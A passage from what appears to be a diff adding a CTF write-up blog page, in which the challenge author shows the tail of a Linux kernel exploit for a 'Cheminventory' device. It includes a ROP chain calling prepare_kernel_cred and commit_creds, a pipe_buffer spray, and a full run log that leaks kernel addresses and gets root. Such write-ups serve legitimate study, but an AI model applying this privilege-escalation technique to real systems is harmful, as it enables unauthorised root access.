+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4433ec</span>; <span style="color:#75715e">// 0xffffffff814433ec : ret 0x100;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x135e00</span>; <span style="color:#75715e">// ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x178</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x05a15f</span>; <span style="color:#75715e">// pop rdi ; pop 5 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x05a15f</span>; <span style="color:#75715e">// pop rdi ; pop 5 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x110</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x05a15f</span>; <span style="color:#75715e">// pop rdi ; pop 5 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1209e80</span>; <span style="color:#75715e">// init_task
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0a8a30</span>; <span style="color:#75715e">// prepare_kernel_cred 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00a903</span>; <span style="color:#75715e">// pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kheap_1024_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x178</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x345de3</span>; <span style="color:#75715e">// push rax ; jmp qword ptr [rcx]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0a8500</span>; <span style="color:#75715e">// commit_creds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa39238</span>; <span style="color:#75715e">// swapgs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x03095f</span>; <span style="color:#75715e">// iretq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_rip;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_cs; 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> user_ss; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">signal</span>(SIGSEGV, get_shell);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying fake pipe_buffer objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SOCKETS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> NUM_SKBUFFS; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(ss[i][<span style="color:#ae81ff">0</span>], secondary_buf, <span style="color:#66d9ef">sizeof</span>(secondary_buf)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Releasing pipe_buffer objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">close</span>(pipefd[i][<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] close&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">close</span>(pipefd[i][<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] close&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } 
+</span></span></code></pre></div><p>Fun fact: I just realized (after doing <a href="https://kaligulaarmblessed.github.io/post/palindromatic-biosctf2024/">Bi0sCTF&rsquo;s palindromatic</a>) that DirtyPipe is probably a cleaner and nicer way to do this (and you don&rsquo;t have to deal with finding annoying kernel ROP gadgets!)</p>
+<p>Running the full exploit:</p>
+<pre tabindex="0"><code>/tmp $ ./exploit
+STAGE 1: SETUP
+[+] Initial setup
+[+] Setting up msg queues
+[+] Setting up sockets
+[+] Opening Cheminventory device
+[+] Spraying padding timerfd
+[+] Created new chemical
+STAGE 2: KERNEL TEXT LEAK
+[!] Replace failed: Operation not permitted
+[+] Spraying timerfds
+[+] Performed read
+[+] Kernel text leak: 0xffffffffbc685cc0
+[+] Kernel base: 0xffffffffbc400000
+STAGE 3: KERNEL HEAP LEAK
+[+] Freeing padding timerfd spray
+[+] Freeing timerfd spray
+[+] Cross cache msg_msg spray
+[+] Fake object 1 msg_msg spray
+[+] Secondary msg_msg spray
+[+] Fake object 2 msg_msg spray
+[+] Fake object 3 msg_msg spray
+[+] Performed read
+[+] Fake object 1 address: 0xffff95974167d600
+[+] msg_msg at vulnerable object: 0x203
+[+] Freeing that one specific primary msg_msg
+[+] Spraying new primary msg_msg
+[+] Performed read
+[+] kmalloc-cg-1024 address: 0xffff9597417e6000
+[+] SELinux security pointer leak: 0xffff959740fcd8d8
+[+] msg_msg at vulnerable object: 0x6
+[+] Freeing that one specific primary msg_msg
+[+] Spraying new primary msg_msg
+[+] Performed read
+[+] Fake object 2 address: 0xffff959741d6a000
+[+] msg_msg at vulnerable object: 0x7
+[+] Freeing that one specific primary msg_msg
+[+] Spraying new primary msg_msg
+[+] Performed read
+[+] Fake object 3 address: 0xffff95974206c000
+[+] msg_msg at vulnerable object: 0x8
+STAGE 4: MAKE FAKE LINKED LIST
+[+] Freeing that one specific primary msg_msg
+[+] Spraying new primary msg_msg
+[+] Freeing fake object 1
+[+] Spraying new fake object 1
+[+] Freeing fake object 2
+[+] Spraying new fake object 2
+[+] Freeing fake object 3
+[+] Spraying new fake object 3
+[+] Freeing secondary msg_msg
+[+] Spraying pipe_buf over freed 1024 area
+[+] Performed free
+STAGE 5: ROP TIME!!!
+[+] Saved state
+[+] Spraying fake pipe_buffer objects
+[+] Releasing pipe_buffer objects
+[+] Returned to userland
+[+] UID: 0, got root!
+/tmp # cd /root
+~ # ls
+flag.txt
+~ # cat flag.txt
+LNC24{1f_y0U_473_n07_P4R7_0f_Th3_501UT10N_YoU_a7E_P47T_0f_Th3_Pr3C1P1T473}
+</code></pre><p>The challenge files and the full exploit can be found here: <a href="https://github.com/KaligulaArmblessed/CTF-Challenges/tree/main/Cheminventory">https://github.com/KaligulaArmblessed/CTF-Challenges/tree/main/Cheminventory</a></p>
+<p>I hope that you have enjoyed this challenge as much as I loved writing it, and thanks for reading!</p>
+
+    <h4><a href="http://localhost:1313/">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    Kaligula Armblessed
+
+<span id="thisyear">2024</span>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        
+        <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 1 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
